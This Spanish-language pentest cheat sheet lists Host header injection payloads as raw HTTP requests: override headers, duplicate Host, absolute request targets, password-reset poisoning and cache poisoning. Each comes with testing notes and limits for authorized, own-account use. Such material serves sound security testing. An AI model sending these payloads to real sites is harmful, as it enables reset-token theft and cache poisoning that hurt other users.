# 🗡️ Host header injection: payloads y técnicas

> **Uso autorizado:** sustituir `{ORIGEN}`, `{TOKEN_A}`, `{ID_PROPIO}` y `{ID_CONTROLADO_B}` por valores del entorno y de cuentas propias. No ejecutar muestras que cambien estado sin permiso específico y plan de reversión.

## 🎯 Preparación

- Capturar primero la solicitud legítima y su respuesta esperada.
- Mantener igual método, sesión, cabeceras y cuerpo salvo el campo bajo prueba.
- Usar un marcador único como `prueba-123` para distinguir reflejos y efectos de caché.

> **Lectura del banco:** cuando un bloque enumera varias URL, rutas, cabeceras o cuerpos, cada línea suele ser una alternativa. Elegir la variante que corresponde al motor, parser y flujo real.

## 💉 Payloads básicos

### Host alternativo bajo conexión original

```http
Host: {ORIGEN}
Host: {CONTROLLED_HOST}
```

**Cuándo usarlo:** Son alternativas, nunca dos Host en esta prueba. Mantener conexión/SNI hacia el objetivo con un proxy y comparar Location o enlaces propios.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/host-header/exploiting).


### Host reenviado

```http
Host: {ORIGEN}
X-Forwarded-Host: {CONTROLLED_HOST}
```

**Cuándo usarlo:** Estos dos campos van en la misma solicitud. Documentar si la aplicación genera URL hacia el host propio; el reflejo no demuestra envenenamiento de reset.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/host-header/exploiting).


## 🧭 Payloads por contexto

### Otras cabeceras de override

```http
X-Host: {CONTROLLED_HOST}
X-Forwarded-Server: {CONTROLLED_HOST}
X-HTTP-Host-Override: {CONTROLLED_HOST}
Forwarded: host={CONTROLLED_HOST};proto=https
```

**Cuándo usarlo:** Añadir una variante cada vez manteniendo Host legítimo. La precedencia depende del proxy y framework; no combinar sin necesidad.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/host-header/exploiting).


### Puerto y validación del nombre

```http
Host: {ORIGEN}:8443
Host: {ORIGEN}.{CONTROLLED_HOST}
Host: {CONTROLLED_HOST}.{ORIGEN}
```

**Cuándo usarlo:** Una línea por request; la segunda es dominio propio que empieza por el host permitido, la tercera exige controlar un subdominio del objetivo. No inferir bypass por 200 genérico.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/host-header/exploiting).


## 🔥 Payloads avanzados

### Host duplicado solo en laboratorio HTTP/1.1

```http
GET /canary-{NONCE} HTTP/1.1
Host: {ORIGEN}
Host: {CONTROLLED_HOST}
```

**Cuándo usarlo:** Solicitud deliberadamente ambigua y posiblemente rechazada. Usar conexión directa en laboratorio y comparar parsers; no enviar a infraestructura compartida.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/host-header/exploiting).


### Enlace absoluto de flujo propio

```http
POST /account/reset HTTP/1.1
Host: {ORIGEN}
X-Forwarded-Host: {CONTROLLED_HOST}
Content-Type: application/x-www-form-urlencoded

email={EMAIL_PROPIO_URLENCODED}
```

**Cuándo usarlo:** Solo cuenta/correo propios. Inspeccionar el enlace recibido sin abrirlo en receptor ajeno ni publicar token; la generación de URL controlada debe demostrarse.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/host-header/exploiting).


## 🔬 Pruebas guiadas por escenario

### 1. Host directo

**Objetivo:** Inspeccionar URLs absolutas y redirecciones generadas para cuenta propia.

```http
GET / HTTP/1.1
Host: {CONTROLLED_HOST}
```

**Interpretación:** Un 400 es normal. Un Location con host controlado es primitive; impacto depende del flujo.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/host-header/exploiting).

### 2. X-Forwarded-Host

**Objetivo:** Proxy mantiene Host válido y backend podría confiar en la cabecera adicional.

```http
GET / HTTP/1.1
Host: {ORIGEN}
X-Forwarded-Host: {CONTROLLED_HOST}
```

**Interpretación:** Comparar URLs absolutas con control sin cabecera.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/host-header/exploiting).

### 3. Forwarded host=

**Objetivo:** Alternativa estandarizada con sintaxis RFC 7239.

```http
GET / HTTP/1.1
Host: {ORIGEN}
Forwarded: host={CONTROLLED_HOST};proto=https
```

**Interpretación:** Confirmar que el host se usa en el sink, no solo se refleja.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/host-header/exploiting).

### 4. X-Host

**Objetivo:** Cabecera de override usada por algunas pilas; confirmar manualmente.

```http
GET / HTTP/1.1
Host: {ORIGEN}
X-Host: {CONTROLLED_HOST}
```

**Interpretación:** Un cambio de respuesta sugiere soporte; no implica control sobre correo o caché.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/host-header/exploiting).

### 5. Host duplicado

**Objetivo:** Solo en laboratorio o endpoint aislado; proxies pueden seleccionar el primero o segundo.

```http
GET /test-owned HTTP/1.1
Host: {ORIGEN}
Host: {CONTROLLED_HOST}
```

**Interpretación:** Comparar routing y URL generada; un error o cierre de conexión es defensa esperada.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/host-header/exploiting).

### 6. URL absoluta en línea de request

**Objetivo:** Explorar discrepancia entre request target absoluto y Host.

```http
GET https://{ORIGEN}/test-owned HTTP/1.1
Host: {CONTROLLED_HOST}
```

**Interpretación:** Dos capas pueden elegir host distinto; usar solo recursos propios y comprobar cuál componente respondió.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/host-header/exploiting).

### 7. Host con puerto no numérico

**Objetivo:** Comprobar si el validador descarta el puerto antes de construir enlaces; solo en laboratorio.

```http
GET /test-owned HTTP/1.1
Host: {ORIGEN}:prueba-123
```

**Interpretación:** Un enlace absoluto que retiene el sufijo muestra un desacuerdo de parseo; confirmar impacto en un flujo real.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/host-header/exploiting).

### 8. Reset poisoning en correo propio

**Objetivo:** Enviar exclusivamente a email de prueba; buscar enlace generado desde Host no confiable.

```http
POST /forgot-password HTTP/1.1
Host: {ORIGEN}
X-Forwarded-Host: {CONTROLLED_HOST}
Content-Type: application/x-www-form-urlencoded

email={EMAIL_PROPIO}
```

**Interpretación:** Confirmar el host dentro del correo real y proteger el token; no basta la respuesta HTTP.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/host-header/exploiting).

### 9. Enrutamiento de backend hacia listener propio

**Objetivo:** Solo laboratorio con reverse proxy y hostname propio; no usar direcciones internas.

```http
GET /route-prueba-123 HTTP/1.1
Host: {CONTROLLED_HOST}
```

**Interpretación:** Una conexión desde el backend al listener prueba efecto de routing; distinguirla de la solicitud directa del navegador.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/host-header/exploiting).

### 10. Contaminación de caché con Host no clave

**Objetivo:** Únicamente caché aislada o endpoint de prueba con nonce; no afectar tráfico de usuarios.

```http
GET /test-owned?nonce=123 HTTP/1.1
Host: {ORIGEN}
X-Forwarded-Host: {CONTROLLED_HOST}
```

**Interpretación:** Repetir sin X-Forwarded-Host y verificar si un enlace con host propio se sirve desde caché bajo la misma clave; limpiar el marcador.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/host-header/exploiting).

## ✅ Evidencia mínima

1. Solicitud de control y solicitud modificada, con diferencias visibles.
2. Respuesta o efecto observado en una cuenta/objeto de prueba independiente.
3. Explicación del control que falló y del alcance real comprobado.

---

[📖 Descripción y análisis](../Descripcion/README.md) · [← Índice general](../../README.md)
